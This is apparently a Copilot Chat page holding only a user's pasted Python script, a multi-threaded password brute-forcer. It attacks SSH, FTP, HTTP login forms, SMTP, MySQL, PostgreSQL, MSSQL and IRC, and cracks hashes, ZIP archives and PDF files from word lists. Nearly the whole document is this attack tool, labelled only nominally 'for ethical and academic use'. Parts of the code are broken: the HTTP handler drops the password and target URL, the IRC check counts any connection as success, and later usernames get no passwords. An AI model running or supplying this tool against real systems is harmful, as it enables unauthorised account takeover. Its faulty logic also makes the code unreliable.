Copilot Chat
New conversation
You said: #!/usr/bin/env python3 import argparse import threading import queue import socket import sys import
#!/usr/bin/env python3
import argparse
import threading
import queue
import socket
import sys
import time

# Protocol-specific imports
import paramiko        # SSH
import ftplib          # FTP
import requests        # HTTP/HTTPS
import smtplib         # SMTP
import pymysql         # MySQL
import psycopg2        # PostgreSQL
import pymssql         # MS SQL
import xmpp            # XMPP (using sleekxmpp or alternative)
import hashlib         # for hash check
import zipfile         # ZIP bruteforce
import PyPDF2          # PDF password check

# For demonstration, not all imports may be installed by default
# xmpp and some DB libs may require installation by user.

# ----------- Helper Functions ------------

def print_dbg(msg, debug):
    if debug:
        print(msg)

# ----------- Brute force worker ------------

class BruteForceWorker(threading.Thread):
    def __init__(self, target_func, username_queue, password_queue, debug=False):
        super().__init__()
        self.target_func = target_func
        self.username_queue = username_queue
        self.password_queue = password_queue
        self.debug = debug
        self.found = False

    def run(self):
        while not self.found:
            try:
                username = self.username_queue.get_nowait()
            except queue.Empty:
                return
            while True:
                try:
                    password = self.password_queue.get_nowait()
                except queue.Empty:
                    break
                # Call target function with username and password
                success = self.target_func(username, password)
                if success:
                    print(f"[+] Found credentials! {username}:{password}")
                    self.found = True
                    # Put back unused items to avoid blocking other threads
                    self.username_queue.put(username)
                    return
                else:
                    print_dbg(f"[-] Failed {username}:{password}", self.debug)

# ----------- Protocol bruteforce implementations ------------

# SSH
def ssh_bruteforce(username, password, target_ip, debug=False):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target_ip, username=username, password=password, timeout=5)
        ssh.close()
        return True
    except Exception as e:
        print_dbg(f"SSH fail: {username}:{password} -> {e}", debug)
        return False

# FTP
def ftp_bruteforce(username, password, target_ip, debug=False):
    try:
        ftp = ftplib.FTP()
        ftp.connect(target_ip, timeout=5)
        ftp.login(user=username, passwd=password)
        ftp.quit()
        return True
    except Exception as e:
        print_dbg(f"FTP fail: {username}:{password} -> {e}", debug)
        return False

# HTTP/HTTPS
def http_bruteforce(username, password, target_url, debug=False):
    # This is a basic POST example - users can customize for their login form
    login_data = {'username': username, 'password': password}
    try:
        # POST login attempt
        r = requests.post(target_url, data=login_data, timeout=5)
        if "login failed" not in r.text.lower():
            return True
        else:
            print_dbg(f"HTTP fail: {username}:{password}", debug)
            return False
    except Exception as e:
        print_dbg(f"HTTP error: {e}", debug)
        return False

# SMTP
def smtp_bruteforce(username, password, smtp_server, port=25, use_ssl=False, debug=False):
    try:
        if use_ssl:
            server = smtplib.SMTP_SSL(smtp_server, port, timeout=5)
        else:
            server = smtplib.SMTP(smtp_server, port, timeout=5)
        server.ehlo()
        server.login(username, password)
        server.quit()
        return True
    except Exception as e:
        print_dbg(f"SMTP fail: {username}:{password} -> {e}", debug)
        return False

# MySQL
def mysql_bruteforce(username, password, target_ip, port=3306, debug=False):
    try:
        conn = pymysql.connect(host=target_ip, user=username, password=password, port=port, connect_timeout=5)
        conn.close()
        return True
    except Exception as e:
        print_dbg(f"MySQL fail: {username}:{password} -> {e}", debug)
        return False

# PostgreSQL
def postgres_bruteforce(username, password, target_ip, port=5432, debug=False):
    try:
        conn = psycopg2.connect(host=target_ip, user=username, password=password, port=port, connect_timeout=5)
        conn.close()
        return True
    except Exception as e:
        print_dbg(f"PostgreSQL fail: {username}:{password} -> {e}", debug)
        return False

# MSSQL
def mssql_bruteforce(username, password, target_ip, port=1433, debug=False):
    try:
        conn = pymssql.connect(server=target_ip, user=username, password=password, port=port, timeout=5)
        conn.close()
        return True
    except Exception as e:
        print_dbg(f"MSSQL fail: {username}:{password} -> {e}", debug)
        return False

# IRC (simplified: connect with password if needed)
def irc_bruteforce(username, password, target_ip, port=6667, debug=False):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, port))
        s.send(f"PASS {password}\r\n".encode())
        s.send(f"NICK {username}\r\n".encode())
        # No full IRC protocol validation here
        s.close()
        return True  # Assume success if no exception
    except Exception as e:
        print_dbg(f"IRC fail: {username}:{password} -> {e}", debug)
        return False

# Hash bruteforce (only password list, no username)
def hash_bruteforce(target_hash, hash_type, password_list, debug=False):
    hash_func = getattr(hashlib, hash_type, None)
    if not hash_func:
        print(f"[-] Unsupported hash type {hash_type}")
        return
    for pwd in password_list:
        pwd = pwd.strip()
        h = hash_func(pwd.encode()).hexdigest()
        if h == target_hash:
            print(f"[+] Found password for hash {target_hash}: {pwd}")
            return pwd
        else:
            print_dbg(f"Hash {hash_type} fail: {pwd}", debug)
    print("[-] Password not found.")
    return None

# Zip file bruteforce
def zip_bruteforce(zip_path, password_list, debug=False):
    try:
        zf = zipfile.ZipFile(zip_path)
        for pwd in password_list:
            pwd_bytes = pwd.strip().encode('utf-8')
            try:
                zf.extractall(pwd=pwd_bytes)
                print(f"[+] Found ZIP password: {pwd}")
                return pwd
            except RuntimeError:
                print_dbg(f"ZIP fail: {pwd}", debug)
                continue
        print("[-] ZIP password not found.")
        return None
    except Exception as e:
        print(f"[-] ZIP file error: {e}")
        return None

# PDF bruteforce
def pdf_bruteforce(pdf_path, password_list, debug=False):
    try:
        reader = PyPDF2.PdfReader(pdf_path)
        for pwd in password_list:
            try:
                if reader.decrypt(pwd.strip()) == 1:
                    print(f"[+] Found PDF password: {pwd}")
                    return pwd
                else:
                    print_dbg(f"PDF fail: {pwd}", debug)
            except Exception:
                continue
        print("[-] PDF password not found.")
        return None
    except Exception as e:
        print(f"[-] PDF file error: {e}")
        return None

# Add more protocol bruteforcing functions as needed...

# ----------- Main CLI ------------

def main():
    parser = argparse.ArgumentParser(description="Advanced multi-protocol bruteforcer for ethical and academic use only.")
    parser.add_argument("target", help="Target URL or IP with protocol prefix (e.g., ssh://1.2.3.4, ftp://1.2.3.4, http://example.com)")
    parser.add_argument("-l", "--username", help="Single username to test")
    parser.add_argument("-L", "--userlist", help="File with multiple usernames")
    parser.add_argument("-P", "--passlist", required=True, help="Password list file")
    parser.add_argument("-t", "--threads", type=int, default=4, help="Number of concurrent threads (default 4)")
    parser.add_argument("--dbg", action="store_true", help="Enable debug verbose output")
    parser.add_argument("-p", "--port", type=int, help="Port number if applicable")
    parser.add_argument("-S", "--ssl", action="store_true", help="Use SSL (only for SMTP, HTTP/HTTPS)")
    parser.add_argument("-f", "--file", help="File path (for zip/pdf bruteforce or hash file)")

    args = parser.parse_args()

    # Load usernames
    usernames = []
    if args.username:
        usernames.append(args.username)
    elif args.userlist:
        try:
            with open(args.userlist, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[-] Could not open userlist: {e}")
            sys.exit(1)
    else:
        # For hash or file bruteforce, username is not needed
        usernames = [None]

    # Load passwords
    try:
        with open(args.passlist, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[-] Could not open password list: {e}")
        sys.exit(1)

    # Parse target protocol and host
    target = args.target
    if "://" not in target:
        print("[-] Target must be in protocol:// format")
        sys.exit(1)

    proto, target_rest = target.split("://", 1)
    target_ip = None
    target_port = args.port

    # Handle protocol-specific parsing
    # Some protocols like mysql://ip:port, smtp://server, http://url

    # Simple target_ip extraction:
    if proto in ["ssh", "ftp", "smb", "xmpp", "irc", "oracle", "mssql", "postgres"]:
        # ip or ip:port
        if ":" in target_rest:
            ip, port_str = target_rest.split(":", 1)
            target_ip = ip
            if not target_port:
                try:
                    target_port = int(port_str)
                except:
                    pass
        else:
            target_ip = target_rest
    elif proto in ["mysql"]:
        # mysql://ip:port
        if ":" in target_rest:
            ip, port_str = target_rest.split(":", 1)
            target_ip = ip
            if not target_port:
                target_port = int(port_str)
        else:
            target_ip = target_rest
    elif proto in ["smtp"]:
        # smtp server domain or ip
        target_ip = target_rest
        if not target_port:
            target_port = 465 if args.ssl else 25
    elif proto in ["http", "https"]:
        target_ip = target_rest
    elif proto in ["pdf", "zip", "hash"]:
        target_ip = None
    else:
        print(f"[-] Unsupported protocol: {proto}")
        sys.exit(1)

    # Create queues for threading
    username_queue = queue.Queue()
    password_queue = queue.Queue()

    for u in usernames:
        if u is not None:
            username_queue.put(u)
    for p in passwords:
        password_queue.put(p)

    # Select target function based on protocol
    def dummy_target(username, password):
        return False

    if proto == "ssh":
        target_func = lambda u, p: ssh_bruteforce(u, p, target_ip, debug=args.dbg)
    elif proto == "ftp":
        target_func = lambda u, p: ftp_bruteforce(u, p, target_ip, debug=args.dbg)
    elif proto == "http" or proto == "https":
        target_func = lambda u, p: http_bruteforce(u, target, debug=args.dbg)
    elif proto == "smtp":
        target_func = lambda u, p: smtp_bruteforce(u, p, target_ip, port=target_port, use_ssl=args.ssl, debug=args.dbg)
    elif proto == "mysql":
        target_func = lambda u, p: mysql_bruteforce(u, p, target_ip, port=target_port or 3306, debug=args.dbg)
    elif proto == "postgres":
        target_func = lambda u, p: postgres_bruteforce(u, p, target_ip, port=target_port or 5432, debug=args.dbg)
    elif proto == "mssql":
        target_func = lambda u, p: mssql_bruteforce(u, p, target_ip, port=target_port or 1433, debug=args.dbg)
    elif proto == "irc":
        target_func = lambda u, p: irc_bruteforce(u, p, target_ip, port=target_port or 6667, debug=args.dbg)
    elif proto == "hash":
        # offline hash cracking
        if not args.file:
            print("[-] For hash bruteforce, provide -f hash_file")
            sys.exit(1)
        try:
            with open(args.file, 'r') as f:
                target_hash = f.readline().strip()
            hash_type = "sha256"  # Example, can be parameterized
            hash_bruteforce(target_hash, hash_type, passwords, debug=args.dbg)
        except Exception as e:
            print(f"[-] Error reading hash file: {e}")
        return
    elif proto == "zip":
        if not args.file:
            print("[-] For ZIP bruteforce, provide -f zip_file")
            sys.exit(1)
        zip_bruteforce(args.file, passwords, debug=args.dbg)
        return
    elif proto == "pdf":
        if not args.file:
            print("[-] For PDF bruteforce, provide -f pdf_file")
            sys.exit(1)
        pdf_bruteforce(args.file, passwords, debug=args.dbg)
        return
    else:
        print(f"[-] Protocol {proto} not implemented.")
        sys.exit(1)

    # Launch threads
    workers = []
    for i in range(args.threads):
        w = BruteForceWorker(target_func, username_queue, password_queue, debug=args.dbg)
        workers.append(w)
        w.start()

    for w in workers:
        w.join()

    print("[*] Brute force finished.")

if __name__ == "__main__":
    main()
